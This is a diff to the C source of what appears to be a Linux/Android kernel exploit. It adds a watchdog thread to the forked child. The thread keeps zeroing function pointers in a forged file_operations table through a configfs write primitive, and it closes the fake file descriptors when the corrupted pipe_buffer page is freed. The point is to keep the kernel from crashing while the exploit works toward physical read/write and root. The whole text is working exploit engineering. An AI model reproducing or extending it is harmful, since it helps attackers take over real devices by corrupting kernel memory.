@@ -62,6 +62,53 @@ pid_t pipe_prepare_child = -1;
  * through physrw/root/fail-path and is reclaimed exactly when the chain
  * retires the round. */
 static int g_payload_hold_sv[2] = {-1, -1};
+
+/* fix75 (redo50): in-child watchdog for the pipe_prepare fork.  See the
+ * long comment at the create site (below, next to result_pipe).  These
+ * live at file scope so the thread body can be a plain function (clang
+ * has no nested functions). */
+static volatile sig_atomic_t fix75_armed;
+static int fix75_keep_fd = -1; /* result_pipe[1] -- must survive to write */
+static void *fix75_watch_thread(void *arg) {
+  (void)arg;
+  while (!fix75_armed) {
+    usleep(200000);
+  }
+  int fails = 0;
+  for (;;) {
+    if (g_fops_probe_fd < 0) {
+      return NULL; /* fix71's post-prepare sweep already cleaned up */
+    }
+    uint64_t z = 0;
+    ssize_t wf = configfs_write_once(g_fops_probe_fd,
+                                     fops_table_base() + FOPS_FLUSH_OFF, &z, 8);
+    ssize_t wr = configfs_write_once(g_fops_probe_fd,
+                                     fops_table_base() + FOPS_RELEASE_OFF, &z, 8);
+    if (wf == 8 && wr == 8) {
+      fails = 0;
+    } else if (++fails >= 2) {
+      pr_warning("fix75: page dead (sanitize wf=%zd wr=%zd fail=%d); "
+                 "sweeping fake fds while flush is still zeroed\n",
+                 wf, wr, fails);
+      for (int fd = 3; fd < 4096; fd++) {
+        if (fd == g_payload_hold_sv[0] || fd == g_payload_hold_sv[1]) {
+          continue;
+        }
+        if (fd == fix75_keep_fd) {
+          continue; /* result_pipe[1] not yet consumed by the write below */
+        }
+        close(fd);
+      }
+      g_fops_probe_fd = -1;
+      fix75_keep_fd = -1;
+      for (;;) {
+        sleep(60); /* clean table; any later SIGKILL exit is safe */
+      }
+    }
+    usleep(500000);
+  }
+}
+
 uint64_t kmalloc_pipe_cache;
 uint64_t kmalloc_normal_1k_cache;
 uint64_t kmalloc_normal_2k_cache;
@@ -908,6 +955,8 @@ uintptr_t prepare_pipe_buffer_page(void) {
 
   int result_pipe[2];
   SYSCHK(pipe(result_pipe));
+  fix75_armed = 0;
+  fix75_keep_fd = result_pipe[1];
   pid_t child = SYSCHK(fork());
   if (child == 0) {
     ks_child_no_atexit = 1;
@@ -945,9 +994,29 @@ uintptr_t prepare_pipe_buffer_page(void) {
       signal(SIGUSR1, SIG_IGN);
       signal(SIGUSR2, SIG_IGN);
     }
+    /* fix75: start the in-child watchdog NOW (page alive, right after the
+     * fork).  It re-sanitises flush/release=0 every 500ms while the page
+     * lives; two consecutive ENOTTY failures mean the page died mid-
+     * prepare (redo50: 0 "pipe convert flip" lines -- prepare never
+     * finished, so fix71's post-prepare sanitize never ran, and the
+     * parent's fail path SIGKILLed this child onto a REUSED page:
+     * pstore pc=0x0 lr=filp_close+0x54 x21=d300000000000000 Comm:
+     * pipe_prepare -> QCOM watchdog bite).  On detection it sweeps the
+     * fake fds within the init_on_alloc zeroed window (flush==0 -> close
+     * -> cbz) and sleeps forever, so the eventual SIGKILL exit_files
+     * walks a clean table.  result_pipe[1] is exempted until the write
+     * below completes (fix75_keep_fd). */
+    {
+      pthread_t fix75_th;
+      fix75_armed = 1; /* keep_fd already exempts result_pipe[1] */
+      if (pthread_create(&fix75_th, NULL, fix75_watch_thread, NULL) == 0) {
+        pthread_detach(fix75_th);
+      }
+    }
     SYSCHK(close(result_pipe[0]));
     uintptr_t base = prepare_pipe_buffer_page_child();
     SYSCHK(write(result_pipe[1], &base, sizeof(base)));
+    fix75_keep_fd = -1; /* watchdog may sweep it from here on */
     close(result_pipe[1]);
     /* Prepare is done and this child no longer needs ANY inherited fd: the
      * fake-fops ones (inherited g_fops_probe_fd, the conv_fd dup inside
